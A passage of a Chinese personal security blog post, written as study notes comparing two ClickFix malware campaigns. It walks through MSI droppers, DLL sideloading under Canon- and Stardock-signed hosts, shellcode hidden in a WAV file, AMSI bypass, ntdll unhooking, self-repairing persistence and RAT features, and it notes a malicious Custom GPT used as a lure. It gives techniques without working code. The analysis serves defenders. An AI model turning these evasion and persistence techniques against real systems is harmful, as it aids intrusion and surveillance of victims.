+<li>安装结束立刻自定义动作启动**带有 Canon 官方数字签名的正常程序<code>COTFileReadApp.exe</code>**。<br>|序号|文件名|文件性质|在攻击链中的作用|<br>|—|—|<br>|<code>COTFileReadApp.exe</code>|合法白文件（Canon 数字签名）|来自 Canon CaptureOnTouch 的正常程序，作为 DLL 侧加载的宿主进程。安装完成后由 MSI 自定义动作自动启动。|<br>|<code>COTFileReadApp.dll</code>|合法白文件（Canon 原生代码）|Canon 程序的配套 DLL，负责加载日志库 ceiinfolog.dll，是触发侧加载的入口。|<br>|<code>ceiinfolog.dll</code>|被篡改的合法 DLL（签名已剥离）|原本是 Canon 的日志库，被攻击者修补：保留了原版导出函数和 PDB 调试路径，但导入表被新增了一项 rdCore.dll!instance_levels_，导致加载时自动带出恶意 DLL。|<br>|<code>rdCore.dll</code>|纯恶意 DLL（无签名）核心加载器|版本信息伪装成 Polly 7.2.3（一个流行的.NET 容错库），实际是 C++&#x2F;CLI 原生代码。负责从.wav 文件中提取并解密 Shellcode。|<br>|<code>WPFLocalizeExtension.dll</code>|纯恶意 DLL（无签名）|盗用开源 WPF 本地化库的文件名，实际是原生代码，导出 split_parameters、Language、Mail 等函数，为 Shellcode 分配可执行内存并创建线程。|<br>|<code>WMPCL.dll</code>|纯恶意 DLL（无签名）|由 rdCore.dll 在载荷运行前加载的辅助 DLL，配合完成内存解密与执行。|<br>|<code>Common.Integrator.Preview.wav</code>|伪装载体文件|表面是一个标准 WAV 音频文件（16 位立体声 PCM，22050Hz），开头是真实音频数据，但在偏移 0x24362 处之后被覆盖为加密的 Shellcode 载荷（341,395 字节）。|<br>|<code>monitor.raw</code>|自制加密归档|攻击者自定义的加密文件系统（类似自制加密 zip），包含 1128 个条目（315 个文件夹、806 个文件）。内部藏有持久化脚本和最终 RAT Shellcode（@input，1.58MB）。|</li>
+</ul>
+<blockquote>
+<p>重点：即使 Defender 识别并隔离<code>ISOSimple.msi</code>，只要 MSI 已经运行完毕，持久化项已经写入系统，隔离 MSI 文件无法清除已植入的威胁。</p>
+</blockquote>
+<h3 id="阶段-4：DLL-Sideloading（DLL-侧加载）突破"><a href="#阶段-4：DLL-Sideloading（DLL-侧加载）突破" class="headerlink" title="阶段 4：DLL Sideloading（DLL 侧加载）突破"></a>阶段 4：DLL Sideloading（DLL 侧加载）突破</h3><ol>
+<li><code>COTFileReadApp.exe</code>（Canon 签名，白文件）会正常加载同目录下的<code>ceiinfolog.dll</code>（Canon 原本的日志库）。</li>
+<li>攻击者提供<strong>被修补篡改的 ceiinfolog.dll</strong>：保留原版导出函数、调试 pdb 路径、编译时间，但是移除数字签名，修改导入表，强制依赖恶意无符号 DLL <code>rdCore.dll</code>。</li>
+<li>Windows 加载 DLL 时会优先读取<strong>程序自身目录</strong>的 DLL；只要加载<code>ceiinfolog.dll</code>，操作系统自动加载依赖项<code>rdCore.dll</code>，恶意代码在<strong>合法签名进程空间运行</strong>，极大规避安全软件告警。</li>
+<li>配套还有伪装名称的辅助恶意 DLL：<code>WPFLocalizeExtension.dll</code>、<code>WMPCL.dll</code>。</li>
+</ol>
+<blockquote>
+<p>V2 版本变体：全部替换为 **Stardock 签名程序<code>DeElevate64.exe</code>**，修补对应的<code>DeElevator64.dll</code>，恶意 DLL 名字同步更换，攻击逻辑完全不变，仅更换白签名载体。</p>
+</blockquote>
+<h3 id="阶段-5：从伪装载体文件提取-Shellcode"><a href="#阶段-5：从伪装载体文件提取-Shellcode" class="headerlink" title="阶段 5：从伪装载体文件提取 Shellcode"></a>阶段 5：从伪装载体文件提取 Shellcode</h3><ul>
+<li>V1：载体文件<code>Common.Integrator.Preview.wav</code>，具备标准 WAV 音频头，开头部分是真实音频数据；偏移<code>0x24362</code>之后，音频数据被覆盖为加密载荷。<ul>
+<li>不是传统隐写，直接把密文覆盖音频后半段，文件工具识别为 wav，欺骗基于文件后缀 &#x2F; 文件头的自动化扫描工具。</li>
+<li><code>rdCore.dll</code>定位该 wav 文件，读取指定偏移的数据，使用<strong>多变量滚动 XOR 算法解密</strong>，得到 x64 位置无关 Shellcode。</li>
+</ul>
+</li>
+<li>V2 变体：不再用 wav，把载荷藏在微软 NuGet 包文件<code>Build.dat</code>的压缩段内，混淆效果更强。</li>
+</ul>
+<h3 id="阶段-6：Shellcode-加载器执行（大量对抗-EDR-沙箱）"><a href="#阶段-6：Shellcode-加载器执行（大量对抗-EDR-沙箱）" class="headerlink" title="阶段 6：Shellcode 加载器执行（大量对抗 EDR &#x2F; 沙箱）"></a>阶段 6：Shellcode 加载器执行（大量对抗 EDR &#x2F; 沙箱）</h3><p>解密出来的原始 shellcode 没有任何可读字符串，全部字符串运行时在栈上动态解密，能力包括：</p>
+<ol>
+<li><strong>AMSI Bypass</strong>：绕过 Windows 反恶意软件扫描接口，阻止安全产品内存脚本检测。</li>
+<li><strong>ntdll 解钩子（unhooking）</strong>：重新映射干净 ntdll，绕过 EDR 对系统 API 的监控钩子。</li>
+<li><strong>反虚拟机检测</strong>：检测 VMware、VirtualBox、Hyper‑V、QEMU 等虚拟机驱动和服务，沙箱环境改变行为。</li>
+<li>内存加载.NET 运行库，不需要落地.NET 程序集。</li>
+<li>弹出虚假<code>LOADING...</code>窗口迷惑普通用户。</li>
+<li>寻找本地的自制加密归档文件：<code>monitor.raw</code>（V2 为<code>execute_engine_disconnect.raw</code>）。</li>
+</ol>
+<h3 id="阶段-7：解析自制加密文件系统，部署持久化-RAT"><a href="#阶段-7：解析自制加密文件系统，部署持久化-RAT" class="headerlink" title="阶段 7：解析自制加密文件系统，部署持久化 + RAT"></a>阶段 7：解析自制加密文件系统，部署持久化 + RAT</h3><p><code>monitor.raw</code>是攻击者<strong>自制的加密文件系统（自定义类 zip 归档）</strong>，不是标准压缩格式：</p>
+<ol>
+<li>内部包含 1128 个目录 &#x2F; 文件条目，共 315 文件夹，806 个文件；索引和每个文件均使用主密钥 + 盐 + 单字节 XOR 加密，没有密钥无法解析。</li>
+<li>归档内置一套攻击者自研脚本语言：实现<strong>双机制持久化</strong><ul>
+<li>注册表 HKCU Run 启动项</li>
+<li>计划任务</li>
+<li>两者统一命名（V1：<code>Canon Configuration Reader</code>，V2：<code>Stardock DeElevation Tool</code>）；脚本会定时（Run 每 150 秒，计划任务每 875 秒）检测，一旦持久化项被删除会自动重建。</li>
+<li>清除注意：<strong>必须先终止恶意进程，再删除注册表和计划任务，否则会瞬间复原</strong>。</li>
+</ul>
+</li>
+<li>归档内部<code>@input</code>资源：最终 RAT 完整 Shellcode，内存直接执行。</li>
+</ol>
+<p><strong>RAT（远控木马）核心能力</strong></p>
+<ol>
+<li>主机侦察：WMI 查询杀毒软件、系统版本、网络适配器、端口、已安装软件、硬件指纹（同时作为反 VM 标识）。</li>
+<li>远控能力：远程桌面、屏幕广播、摄像头 &#x2F; 麦克风录音录像；内置文件管理器，支持全盘文件内容搜索。</li>
+<li>载荷投放：可以内存或磁盘落地执行 EXE&#x2F;DLL&#x2F;MSI&#x2F;PowerShell&#x2F;BAT&#x2F;ZIP 等各类恶意样本。</li>
+<li>C2 通信：使用**DoH(DNS‑over‑HTTPS)**，向 Cloudflare&#x2F;Google&#x2F;Quad9 做 DNS 查询，DNS 解析流量不出现在本地 DNS 日志；C2 地址不在本地文件中，运行时获取。</li>
+<li>还会释放第三方合法签名程序<code>GOMCam2024.exe</code>，启动带临时配置文件的 Chrome 浏览器作为后续行为载体。</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h3><ol>
+<li><strong>核心社工模式完全一致（ClickFix 本质）</strong><ul>
+<li>依靠钓鱼页面欺骗用户<strong>手动复制 PowerShell 命令，Win+R 运行</strong>；</li>
+<li>利用用户主动执行，绕过浏览器沙箱、网页防护；</li>
+<li>欺骗话术大多伪装成人机验证、Cloudflare 验证。</li>
+</ul>
+</li>
+<li><strong>初始载体都是 PowerShell</strong><ul>
+<li>使用 powershell 原生参数 <code>-w hidden / -ep bypass</code> 隐藏窗口、绕过执行策略；</li>
+<li>使用 <code>iwr/irm</code> 从攻击者服务器拉取远程脚本；</li>
+<li>大量使用字符串混淆、数组编码，规避静态检测。</li>
+</ul>
+</li>
+<li><strong>多层链式加载、多阶段解密</strong><br>不是一次性落地完整木马，分多阶段下载、解密、加载，前一阶段只负责拉起下一阶段载荷，增加溯源和检测难度。</li>
+<li><strong>大量依赖系统原生白组件（LOLBins）</strong><br>原生 PowerShell、.NET、系统 API，利用白程序执行恶意逻辑，降低 EDR 告警概率。</li>
+<li><strong>流量伪装</strong><br>伪造正常浏览器 UA，模拟正常网页访问流量，规避简单流量检测。</li>
+<li><strong>目标：Windows 终端用户</strong><br>针对普通 Windows 用户，以窃取信息 &#x2F; 控制主机为目标。</li>
+</ol>
+<p>|对比|LevelBlue：PhantomPolia + Remus Stealer|Huntress：ChatGPT Custom GPT + RAT|<br>|—|—|<br>|社工入口 &#x2F; 诱饵|被攻陷的网站、恶意 JS 钓鱼页面；没有依赖 AI 平台；使用区块链 Sepolia 死信箱（dead drop resolver）解析 C2 地址	滥用 ChatGPT 自定义 GPT + Google 广告引流；|诱饵页面托管在 Google Sites；无区块链死信箱；直接硬码C2 &#x2F; 下载地址|<br>|初始 PowerShell 行为|无文件攻击：下载脚本后直接iex内存执行，不落地文件到磁盘|落地型攻击：下载脚本后，下载恶意 MSI 包保存到 % TEMP%，调用msiexec静默安装|<br>|中间载荷载体|AutoIt 脚本 → Donut 打包 Shellcode；Donut 用来把 PE 转为位置无关 Shellcode	MSI 安装包（177 个文件，大量.NET5 白文件稀释恶意文件）|依靠DLL 侧加载（DLL Sideloading），使用厂商签名程序作为宿主|<br>|白宿主|无厂商签名宿主，Donut 直接内存加载|Canon（V1）&#x2F;Stardock（V2）合法签名 EXE，篡改配套 DLL 实现侧加载，白进程承载恶意代码|<br>|载荷藏匿方式|Shellcode 直接由 Donut 生成，内存执行	Shellcode|藏在伪装文件里：V1 藏在 WAV 音频后半段；V2 藏在 NuGet Build.dat；额外存在自定义加密归档monitor.raw|<br>|最终恶意样本|Remus Stealer，窃密类木马；功能：窃取浏览器密码、加密货币钱包、凭证|全功能 RAT 远程控制木马|功能：远程桌面、摄像头 &#x2F; 麦克风、文件浏览、下发后续恶意载荷|<br>|持久化|AutoIt 内存执行，没有自修复持久化机制|双路持久化：注册表 Run + 计划任务；内置脚本定时校验、自动恢复持久化项，删除后会自动重建|<br>|对抗手段|JS 混淆、Donut 壳、区块链死信箱隐匿 C2|PowerShell 双层整数数组混淆、DLL 侧加载、AMSI Bypass、ntdll unhook、反虚拟机、自定义加密文件系统|<br>|IOC 变更方式|更换 C2 地址、更换 JS 加载器|更换签名厂商（Canon→Stardock）、更换载体文件名、更换加密密钥，RAT 主体不变|<br>|痕迹特点|磁盘落地痕迹少，偏向无文件|会在 % LOCALAPPDATA% 释放一堆文件，存在大量磁盘文件痕迹|</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">半枫</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/10/31/ClickFix%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%AD%A6%E4%B9%A0/">http://example.com/2026/10/31/ClickFix%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">半枫</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/qq.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/10/29/%E5%88%9D%E5%AD%A6%E6%A0%B7%E6%9C%AC%E7%9A%84%E5%8C%85%E8%A3%85%E3%80%81%E5%8A%A0%E8%BD%BD%E4%B8%8E%E8%90%BD%E5%9C%B0/" title="从 NeedyMantis 中初学样本的包装、加载与落地"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">从 NeedyMantis 中初学样本的包装、加载与落地</div></div><div class="info-2"><div class="info-item-1">从 NeedyMantis 学样本的”包装、加载与落地” 读完 Microsoft Threat Intelligence 的报告 NeedyMantis: unpacking a post-compromise malware family used in targeted operations（2026-09-28）之后的理解与复盘，原文见文末链接。本文是我的学习笔记，技术事实以原报告为准。  一、背景：这是一个”第二梯队”的植入体NeedyMantis（微软对它的家族命名）是一个模块化的后渗透（post-compromise）恶意软件家族，攻击目标集中在电信、高校、政府间组织、医疗非营利机构和政府承包商，活动最早可以追溯到 2025 年 10 月，微软将其归因到威胁行为者 Storm-3069。有意思的发现路径：它最初是在排查 DAEMON Tools 供应链攻击（Kaspersky 先报告）的相关 IOC 时被顺藤摸瓜挖出来的——但 NeedyMantis 本身并不通过供应链分发。 这个定位很关键。它不是那种自己负责敲门、负责钓鱼、负责提权的”先锋”，而是攻击者已经拿到环...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/qq.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">半枫</div><div class="author-info-description">Welcome to my blog</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">100</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ClickFix%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">ClickFix攻击活动学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%83%8C%E6%99%AF%EF%BC%9A%E8%AE%A9%E7%94%A8%E6%88%B7%E8%87%AA%E5%B7%B1%E6%84%9F%E6%9F%93%E8%87%AA%E5%B7%B1"><span class="toc-number">1.1.</span> <span class="toc-text">一、背景：让用户自己感染自己</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%AC%AC%E4%B8%80%E7%A7%8D%E5%9C%BA%E6%99%AF%EF%BC%9A%E5%9F%BA%E4%BA%8E%E8%A2%AB%E6%94%BB%E9%99%B7%E7%9A%84%E7%BD%91%E7%AB%99"><span class="toc-number">1.2.</span> <span class="toc-text">二、第一种场景：基于被攻陷的网站</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-1-%E9%98%B6%E6%AE%B5%EF%BC%9A%E8%AE%BF%E9%97%AE%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%EF%BC%8C%E8%A7%A6%E5%8F%91-PhantomPolia-%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88JavaScript-%E5%B1%82%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">第 1 阶段：访问被黑网站，触发 PhantomPolia 加载器（JavaScript 层）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-2-%E9%98%B6%E6%AE%B5%EF%BC%9AClickFix-%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E6%8A%95%E9%80%92%EF%BC%88%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5-JavaScript%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">第 2 阶段：ClickFix 钓鱼页面投递（第二阶段 JavaScript）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%98%B6%E6%AE%B5%EF%BC%9A-PowerShell-%E6%89%A7%E8%A1%8C-%EF%BC%88update-ps1%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">第三阶段： PowerShell 执行 （update.ps1）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-4-%E9%98%B6%E6%AE%B5%EF%BC%9AAutoIt-%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.4.</span> <span class="toc-text">第 4 阶段：AutoIt 脚本执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-5-%E9%98%B6%E6%AE%B5%EF%BC%9ADonut-%E6%89%93%E5%8C%85%E7%9A%84-Shellcode"><span class="toc-number">1.2.5.</span> <span class="toc-text">第 5 阶段：Donut 打包的 Shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-6-%E9%98%B6%E6%AE%B5%EF%BC%9ARemus-Stealer-%E7%AA%83%E5%AF%86%E6%9C%A8%E9%A9%AC%E8%BF%90%E8%A1%8C"><span class="toc-number">1.2.6.</span> <span class="toc-text">第 6 阶段：Remus Stealer 窃密木马运行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%9C%BA%E6%99%AF%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%AE%9A%E5%88%B6GPT"><span class="toc-number">1.3.</span> <span class="toc-text">三、第二种场景：基于定制GPT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-1%EF%BC%9A%E8%AF%B1%E9%A5%B5%E6%8A%95%E9%80%92%EF%BC%9A%E6%81%B6%E6%84%8F-Custom-GPT%EF%BC%88%E7%A4%BE%E5%B7%A5%E5%85%A5%E5%8F%A3%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">阶段 1：诱饵投递：恶意 Custom GPT（社工入口）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-2%EF%BC%9AClickFix-%E8%A7%A6%E5%8F%91%EF%BC%8CPowerShell-%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.2.</span> <span class="toc-text">阶段 2：ClickFix 触发，PowerShell 执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-3%EF%BC%9A%E6%81%B6%E6%84%8F-MSI-%E5%AE%89%E8%A3%85%E5%8C%85%E8%90%BD%E5%9C%B0%EF%BC%88V1-%E7%89%88%E6%9C%AC-ISOSimple-msi%EF%BC%89"><span class="toc-number">1.3.3.</span> <span class="toc-text">阶段 3：恶意 MSI 安装包落地（V1 版本 ISOSimple.msi）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-4%EF%BC%9ADLL-Sideloading%EF%BC%88DLL-%E4%BE%A7%E5%8A%A0%E8%BD%BD%EF%BC%89%E7%AA%81%E7%A0%B4"><span class="toc-number">1.3.4.</span> <span class="toc-text">阶段 4：DLL Sideloading（DLL 侧加载）突破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-5%EF%BC%9A%E4%BB%8E%E4%BC%AA%E8%A3%85%E8%BD%BD%E4%BD%93%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96-Shellcode"><span class="toc-number">1.3.5.</span> <span class="toc-text">阶段 5：从伪装载体文件提取 Shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-6%EF%BC%9AShellcode-%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%89%A7%E8%A1%8C%EF%BC%88%E5%A4%A7%E9%87%8F%E5%AF%B9%E6%8A%97-EDR-%E6%B2%99%E7%AE%B1%EF%BC%89"><span class="toc-number">1.3.6.</span> <span class="toc-text">阶段 6：Shellcode 加载器执行（大量对抗 EDR &#x2F; 沙箱）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-7%EF%BC%9A%E8%A7%A3%E6%9E%90%E8%87%AA%E5%88%B6%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%EF%BC%8C%E9%83%A8%E7%BD%B2%E6%8C%81%E4%B9%85%E5%8C%96-RAT"><span class="toc-number">1.3.7.</span> <span class="toc-text">阶段 7：解析自制加密文件系统，部署持久化 + RAT</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%90%8C%E7%82%B9"><span class="toc-number">1.4.1.</span> <span class="toc-text">相同点</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/10/31/ClickFix%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%AD%A6%E4%B9%A0/" title="ClickFix攻击活动学习">ClickFix攻击活动学习</a><time datetime="2026-10-31T07:45:38.000Z" title="发表于 2026-10-31 15:45:38">2026-10-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/10/29/%E5%88%9D%E5%AD%A6%E6%A0%B7%E6%9C%AC%E7%9A%84%E5%8C%85%E8%A3%85%E3%80%81%E5%8A%A0%E8%BD%BD%E4%B8%8E%E8%90%BD%E5%9C%B0/" title="从 NeedyMantis 中初学样本的包装、加载与落地">从 NeedyMantis 中初学样本的包装、加载与落地</a><time datetime="2026-10-29T07:34:03.000Z" title="发表于 2026-10-29 15:34:03">2026-10-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/11/LOLBAS%E6%95%B4%E7%90%86%E5%AD%A6%E4%B9%A0/" title="LOLBAS整理学习">LOLBAS整理学习</a><time datetime="2026-09-11T08:42:39.000Z" title="发表于 2026-09-11 16:42:39">2026-09-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/01/vmp%E8%99%9A%E6%8B%9F%E5%8C%96%E5%AD%A6%E4%B9%A0(2)%EF%BC%9A%E6%8C%87%E4%BB%A4%E6%A8%A1%E6%8B%9F/" title="vmp虚拟化学习(2)：JCC指令模拟">vmp虚拟化学习(2)：JCC指令模拟</a><time datetime="2026-09-01T02:09:02.000Z" title="发表于 2026-09-01 10:09:02">2026-09-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/25/vmp%E8%99%9A%E6%8B%9F%E5%8C%96%E5%AD%A6%E4%B9%A0/" title="vmp虚拟化学习（1）">vmp虚拟化学习（1）</a><time datetime="2026-08-25T00:46:54.000Z" title="发表于 2026-08-25 08:46:54">2026-08-25</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/preview.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 半枫</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
